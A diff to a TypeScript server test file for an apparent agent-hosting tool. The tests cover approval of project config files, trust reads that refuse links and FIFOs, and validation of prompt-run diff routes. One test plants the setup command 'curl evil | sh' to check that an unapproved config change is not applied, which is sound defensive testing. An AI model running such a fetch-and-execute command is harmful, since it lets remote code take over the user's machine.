@@ -26,14 +26,17 @@ import {
   type EnsoPermissionCheckRequest,
   EnsoPermissionVerdict,
   EnsoProject,
+  EnsoProjectConfigReview,
   EnsoProjectSettings,
   EnsoProjectTrust,
   EnsoProjectPromptLibrary,
+  EnsoPromptRunChanges,
   EnsoStoredThread,
   EnsoSystemPromptPreview,
   EnsoThreadCommands,
   EnsoThreadEvents,
   EnsoThreadHistory,
+  EnsoThreadPromptRuns,
   EnsoThreadInspection,
   EnsoThreadSummary,
   type EnsoTranscriptEntry,
@@ -45,7 +48,9 @@ import {
   readEnsoThreadIncidents,
   readEnsoThreadJudgeCases,
 } from '@enso/core'
+import { projectConfigApprovalsPath, projectIdOf } from '@enso/core/paths'
 import { ENSO_DEFAULT_PERMISSION_POLICY } from '@enso/core/permission-rules'
+import { approveProjectTier, reviewProjectConfig } from '@enso/core/project-config'
 import { type FlowTrace, flowTrace } from '@enso/test-support/flow-trace'
 import { recordEnsoLogs, releaseEnsoLogs } from '@enso/test-support/log-recorder'
 import type { LogRecorder } from '@logtape/testing/recorder'
@@ -53,6 +58,7 @@ import { Check } from 'typebox/value'
 import { type AgentHost, SessionDirectoryRefused } from '../../host/agent-host.ts'
 import type { HostedThread, HostedThreadInspection } from '../../host/live-thread.ts'
 import type { ThreadRestoreOutcome, ThreadTreePlace } from '../../host/thread-log-edits.ts'
+import type { PromptRunRead } from '../../host/thread-prompt-run-reads.ts'
 import { transcriptOf } from '../../host/transcript.ts'
 import type { ProjectThreadSettingsSource } from '../../host/tree-setup.ts'
 import { startEnsoServer } from '../index.ts'
@@ -833,7 +839,11 @@ test('removing the launch project says why at once, even while one of its thread
 
 // ── #754: the project page's Worktrees section ────────────────────────────────────────────────
 
-/** A server launched in a fresh project with these tier files; the user's config copies `.env`; pi's trust for the project is `trusted`. */
+/**
+ * A server launched in a fresh project with these tier files, each approved as written (#753) — a
+ * file that cannot be approved stays unapproved; the user's config copies `.env`; pi's trust for the
+ * project is `trusted`.
+ */
 async function settingsServer(options: {
   readonly trusted: boolean
   readonly shared?: unknown
@@ -843,6 +853,11 @@ async function settingsServer(options: {
   mkdirSync(join(project, '.enso'))
   if (options.shared !== undefined) writeFileSync(join(project, '.enso', 'config.json'), JSON.stringify(options.shared))
   if (options.local !== undefined) writeFileSync(join(project, '.enso', 'config.local.json'), options.local)
+  const projectsDir = mkdtempSync(join(tmpdir(), 'enso-settings-projects-'))
+  const approvals = projectConfigApprovalsPath(projectsDir, projectIdOf(project))
+  for (const reviewed of reviewProjectConfig(project, approvals)) {
+    approveProjectTier(project, approvals, { tier: reviewed.tier, sha256: reviewed.current })
+  }
   const agentDir = mkdtempSync(join(tmpdir(), 'enso-settings-agent-'))
   // pi's trust store, written as pi writes it (`<agentDir>/trust.json`, keyed by the real path): this
   // file may not name pi (the vendor gate, #145).
@@ -852,6 +867,7 @@ async function settingsServer(options: {
     readUser: () => ({ threads: { copy: ['.env'] } }),
     userPath,
     canonical: (key: string) => key,
+    projectsDir,
   }
   const { url } = await startWith(settlesAtOnce, {}, undefined, { launch: project, agentDir, threadSettings })
   const launch = ((await (await fetch(`${url}/api/projects`)).json()) as EnsoProject[])[0]
@@ -946,11 +962,71 @@ test('⚠ project settings refusals: an unknown project 404, a body that is not 
   expect(refused.status).toBe(422)
   expect(await refused.text()).toContain('never overwritten')
   expect(readFileSync(join(project, '.enso', 'config.local.json'), 'utf8')).toBe('{ not json')
-  // The page says which file was skipped, so a value from the tier below is not mistaken for it.
-  const { unreadable } = await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))
-  expect(unreadable.map((skipped) => [skipped.tier, skipped.path])).toEqual([
-    ['local', join(project, '.enso', 'config.local.json')],
+  // The page says which file waits, and why it cannot be approved as it is (#753): its values do not apply.
+  const { tiers } = await reviewOf(await fetch(`${url}/api/projects/${projectId}/config-approval`))
+  expect(tiers).toEqual([
+    expect.objectContaining({
+      tier: 'local',
+      path: join(project, '.enso', 'config.local.json'),
+      state: 'unapproved',
+      problem: expect.stringContaining('not valid JSON'),
+    }),
   ])
+})
+
+// ── #753: the project page's approval of the project's own config files ───────────────────────
+
+function putApproval(url: string, projectId: string, body: unknown): Promise<Response> {
+  return fetch(`${url}/api/projects/${projectId}/config-approval`, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: typeof body === 'string' ? body : JSON.stringify(body),
+  })
+}
+
+async function reviewOf(response: Response): Promise<EnsoProjectConfigReview> {
+  expect(response.status).toBe(200)
+  const answered: unknown = await response.json()
+  if (!Check(EnsoProjectConfigReview, answered)) throw new Error('the answer is not EnsoProjectConfigReview')
+  return answered
+}
+
+// The acceptance's second item: the page shows the diff between the approved and the current file,
+// and approving applies it — only as it was shown.
+test('⚠ a file changed after its approval is reviewed as a diff; approving it as shown applies it, a stale approval is 409 (#753)', async () => {
+  const { url, project, projectId } = await settingsServer({ trusted: true, shared: { threads: { setup: ['make'] } } })
+  const sharedPath = join(project, '.enso', 'config.json')
+  writeFileSync(sharedPath, JSON.stringify({ threads: { setup: ['curl evil | sh'] } }))
+  // Not applied: the version approved still is, and a Save over it is refused, so nothing is approved unseen.
+  const settings = await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))
+  expect(settings.threads.setup).toEqual({ value: ['make'], tier: 'shared' })
+  const save = await putSettings(url, projectId, { tier: 'shared', threads: { tree: 'off' } })
+  expect(save.status).toBe(409)
+  expect(await save.text()).toContain('has changed since you approved it')
+
+  const [shared] = (await reviewOf(await fetch(`${url}/api/projects/${projectId}/config-approval`))).tiers
+  expect(shared).toMatchObject({ tier: 'shared', path: sharedPath, state: 'changed' })
+  expect(shared?.patch).toContain('-{"threads":{"setup":["make"]}}')
+  expect(shared?.patch).toContain('+{"threads":{"setup":["curl evil | sh"]}}')
+
+  // Changed again after the page read it: the approval names what was seen, so it is refused.
+  writeFileSync(sharedPath, JSON.stringify({ threads: { setup: ['worse'] } }))
+  const stale = await putApproval(url, projectId, { tier: 'shared', sha256: shared?.current })
+  expect(stale.status).toBe(409)
+  expect((await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))).threads.setup.value).toEqual([
+    'make',
+  ])
+
+  const [now] = (await reviewOf(await fetch(`${url}/api/projects/${projectId}/config-approval`))).tiers
+  const approved = await reviewOf(await putApproval(url, projectId, { tier: 'shared', sha256: now?.current }))
+  expect(approved.tiers).toEqual([expect.objectContaining({ tier: 'shared', state: 'approved', patch: '' })])
+  expect((await settingsOf(await fetch(`${url}/api/projects/${projectId}/settings`))).threads.setup).toEqual({
+    value: ['worse'],
+    tier: 'shared',
+  })
+
+  expect((await putApproval(url, '0123456789abcdef', { tier: 'shared', sha256: null })).status).toBe(404)
+  expect((await putApproval(url, projectId, { tier: 'shared', sha256: 'not-a-hash' })).status).toBe(400)
 })
 
 // ── #873: trust from the project page ─────────────────────────────────────────────────────────
@@ -1088,8 +1164,8 @@ test('⚠ revoking trust retires the project’s idle live threads, so each is b
 
 // The trust read happens BEFORE the project is trusted, so its files are untrusted input: a link
 // could point at a file an agent may not read, and the page would show it; a FIFO would hold the
-// server. Neither is read — each is named, and said to be read anyway once trusted.
-test('⚠ the trust read follows no link and opens no FIFO: each is named, never read, and said to be read once trusted (#873)', async () => {
+// server. Neither is read — each is named, and said to apply nothing: one can't be approved (#753).
+test('⚠ the trust read follows no link and opens no FIFO: each is named, never read, and said to apply nothing (#873, #753)', async () => {
   const { url, project, projectId } = await settingsServer({ trusted: false })
   const outside = mkdtempSync(join(tmpdir(), 'enso-trust-outside-'))
   writeFileSync(join(outside, 'config.json'), JSON.stringify({ threads: { setup: ['leaked-from-outside'] } }))
@@ -1100,14 +1176,12 @@ test('⚠ the trust read follows no link and opens no FIFO: each is named, never
   expect(text).not.toContain('leaked-from-outside')
   const { files } = await trustOf(response)
   expect(files.map((file) => ['unread' in file ? file.unread : 'read', file.tier])).toEqual([
-    [
-      'is not a regular file, so it is not shown here; trusting the project reads it anyway, setup commands included',
-      'local',
-    ],
-    ['is a link, so it is not shown here; trusting the project reads it anyway, setup commands included', 'shared'],
+    ['is not a regular file, so it is not shown here, and nothing in it applies', 'local'],
+    ['is a link, so it is not shown here, and nothing in it applies', 'shared'],
   ])
 
-  // `.enso/` itself a link: the file inside is reached through it, and not read either.
+  // `.enso/` itself a link: each file inside is reached through it, and not read either — the local
+  // one too, though nothing is behind it, since a write would land behind the link (review of #987).
   const linked = await settingsServer({ trusted: false })
   const elsewhere = mkdtempSync(join(tmpdir(), 'enso-trust-dir-'))
   writeFileSync(join(elsewhere, 'config.json'), JSON.stringify({ threads: { setup: ['leaked-through-dir'] } }))
@@ -1117,10 +1191,14 @@ test('⚠ the trust read follows no link and opens no FIFO: each is named, never
   expect(JSON.stringify(throughDir)).not.toContain('leaked-through-dir')
   expect(throughDir.files).toEqual([
     {
+      tier: 'local',
+      path: join(linked.project, '.enso', 'config.local.json'),
+      unread: 'is reached through a link, so it is not shown here, and nothing in it applies',
+    },
+    {
       tier: 'shared',
       path: join(linked.project, '.enso', 'config.json'),
-      unread:
-        'is reached through a link, so it is not shown here; trusting the project reads it anyway, setup commands included',
+      unread: 'is reached through a link, so it is not shown here, and nothing in it applies',
     },
   ])
 })
@@ -2358,6 +2436,140 @@ test('GET …/changes/file needs a path and a held thread, and reads its paths U
   })
   // Encoded, a climb out is still a climb out.
   expect((await read('live1', `?path=${encodeURIComponent('../outside.ts')}`)).status).toBe(400)
+})
+
+// #553, the #985 review: the Diff Viewer's list is read where the thread is served — a stored
+// thread in no project is no thread here (404), as the real host's stored-thread lookup decides.
+test('GET …/prompt-runs answers a served thread with its prompt runs, and one in no project or nowhere with a 404', async () => {
+  const stored = (cwd: string): FakeStoredThread => ({
+    cwd,
+    transcript: [{ kind: 'message', id: 'u1', role: 'user', parts: [{ type: 'text', text: 'one' }] }],
+    modified: new Date('2026-10-14T00:00:00.000Z'),
+    firstMessage: 'one',
+  })
+  const { url, built } = await startWith(settlesAtOnce, {
+    here: stored(tmpdir()),
+    elsewhere: stored('/somewhere/else'),
+  })
+  const served = await fetch(`${url}/api/threads/here/prompt-runs`)
+  expect(served.status).toBe(200)
+  const payload: unknown = await served.json()
+  expect(Check(EnsoThreadPromptRuns, payload)).toBe(true)
+  expect(payload).toMatchObject({ threadId: 'here', promptRuns: [{ promptRun: 1, prompt: 1, entryId: 'u1' }] })
+  const absent = async (threadId: string): Promise<[number, string]> => {
+    const response = await fetch(`${url}/api/threads/${threadId}/prompt-runs`)
+    return [response.status, await response.text()]
+  }
+  expect(await absent('elsewhere')).toEqual([404, 'no session for thread elsewhere'])
+  expect(await absent('never-used')).toEqual([404, 'no session for thread never-used'])
+  // Looking builds nothing (#86).
+  expect(built).toHaveLength(0)
+})
+
+// #553, the #985 review: the two pair routes over HTTP. The query is guarded before the host is
+// asked; the host's answers are the route's statuses — no thread, 404; a refused pair (a hash the
+// branch does not record, two snapshots git cannot compare), 409 with the host's words; a read,
+// the payload with what was asked. What the host reads from git is `thread-prompt-runs.test.ts`'s.
+test('⚠ GET …/prompt-runs/changes and …/file guard their query before the host is asked, and answer its refusals as 404 and 409 (#553)', async () => {
+  const [first, second, stranger] = ['a', 'b', 'c'].map((digit) => digit.repeat(40)) as [string, string, string]
+  const lost = 'e'.repeat(64)
+  const asked: unknown[] = []
+  /** What the host answers each thread id: none, a refusal, or the read. */
+  const answerFor = <Read>(threadId: string, read: Read): PromptRunRead<Read> => {
+    if (threadId === 'nowhere') return { kind: 'no-thread', reason: 'no session for thread nowhere' }
+    if (threadId === 'stranger')
+      return { kind: 'refused', reason: `${stranger} is not a snapshot thread stranger's prompt runs record` }
+    if (threadId === 'lost')
+      return { kind: 'refused', reason: `git could not compare the snapshots: fatal: bad object ${lost}` }
+    return { kind: 'read', read }
+  }
+  const { url } = await startWith(settlesAtOnce, {}, (host: AgentHost) => ({
+    ...host,
+    readPromptRunChanges: (threadId, from, to) => {
+      asked.push(['changes', threadId, from, to])
+      return Promise.resolve(answerFor(threadId, { files: [], truncated: false }))
+    },
+    readPromptRunFileTexts: (threadId, pair, paths) => {
+      asked.push(['file', threadId, pair, paths])
+      return Promise.resolve(
+        answerFor(threadId, { oldText: { kind: 'text', text: 'one\n' } as const, newText: { kind: 'none' } as const }),
+      )
+    },
+  }))
+  const read = async (threadId: string, route: string, query: string): Promise<[number, string]> => {
+    const response = await fetch(`${url}/api/threads/${threadId}/prompt-runs/${route}${query}`)
+    return [response.status, await response.text()]
+  }
+  const pair = `from=${first}&to=${second}`
+
+  // The pair: two snapshot hashes, lowercase hex of 40 or 64 digits — else a 400, the host unasked.
+  const pairRefused: [number, string] = [400, 'name two snapshots: ?from=<hash>&to=<hash>']
+  for (const query of [
+    '',
+    `?to=${second}`,
+    `?from=${first.toUpperCase()}&to=${second}`,
+    `?from=${first.slice(1)}&to=${second}`,
+  ]) {
+    expect(await read('t', 'changes', query)).toEqual(pairRefused)
+  }
+  expect(await read('t', 'file', `?path=b.txt&from=${first}`)).toEqual(pairRefused)
+  // The path: malformed (a climb, empty, an empty segment, a NUL) is a 400 naming it, the host unasked.
+  const file = (paths: Record<string, string>): string =>
+    `?${new URLSearchParams({ from: first, to: second, ...paths }).toString()}`
+  for (const [paths, named] of [
+    [{ path: '../x' }, '"../x"'],
+    [{ path: '' }, '""'],
+    [{}, '""'],
+    [{ path: 'b.txt', oldPath: 'a//b' }, '"a//b"'],
+    [{ path: 'a\0b' }, '"a\\u0000b"'],
+  ] as const) {
+    expect(await read('t', 'file', file(paths))).toEqual([400, `${named} is not a file under the tree`])
+  }
+  expect(asked).toEqual([])
+
+  // The host's answers, as statuses with its words.
+  expect(await read('nowhere', 'changes', `?${pair}`)).toEqual([404, 'no session for thread nowhere'])
+  expect(await read('stranger', 'changes', `?${pair}`)).toEqual([
+    409,
+    `${stranger} is not a snapshot thread stranger's prompt runs record`,
+  ])
+  expect(await read('lost', 'changes', `?from=${first}&to=${lost}`)).toEqual([
+    409,
+    `git could not compare the snapshots: fatal: bad object ${lost}`,
+  ])
+  expect(await read('nowhere', 'file', file({ path: 'b.txt' }))).toEqual([404, 'no session for thread nowhere'])
+  expect((await read('stranger', 'file', file({ path: 'b.txt' })))[0]).toBe(409)
+  const [changedStatus, changedBody] = await read('t', 'changes', `?${pair}`)
+  expect(changedStatus).toBe(200)
+  const changes: unknown = JSON.parse(changedBody)
+  expect(Check(EnsoPromptRunChanges, changes)).toBe(true)
+  expect(changes).toEqual({ threadId: 't', from: first, to: second, files: [], truncated: false })
+
+  // A rename: the old side is asked for at `oldPath`, and the answer names both paths.
+  const [renamedStatus, renamedBody] = await read('t', 'file', file({ path: 'b.txt', oldPath: 'a.txt' }))
+  expect(renamedStatus).toBe(200)
+  expect(JSON.parse(renamedBody)).toEqual({
+    threadId: 't',
+    path: 'b.txt',
+    oldPath: 'a.txt',
+    oldText: { kind: 'text', text: 'one\n' },
+    newText: { kind: 'none' },
+  })
+  expect(asked.at(-1)).toEqual(['file', 't', { from: first, to: second }, { path: 'b.txt', oldPath: 'a.txt' }])
+})
+
+test('a Diff Viewer read that throws is the 500, not a 409 that blames git (#985 review)', async () => {
+  const failing = (): Promise<never> => Promise.reject(new Error('the sessions directory could not be read'))
+  const { url } = await startWith(settlesAtOnce, {}, (host: AgentHost) => ({
+    ...host,
+    readPromptRunChanges: failing,
+    readPromptRunFileTexts: failing,
+  }))
+  const pair = `from=${'a'.repeat(40)}&to=${'b'.repeat(40)}`
+  for (const route of [`changes?${pair}`, `file?${pair}&path=a.txt`]) {
+    const response = await fetch(`${url}/api/threads/t/prompt-runs/${route}`)
+    expect([response.status, await response.text()]).toEqual([500, 'the request failed — see the server log'])
+  }
 })
 
 // #469: the judge cases are read live-or-cold like the incidents; looking builds nothing.
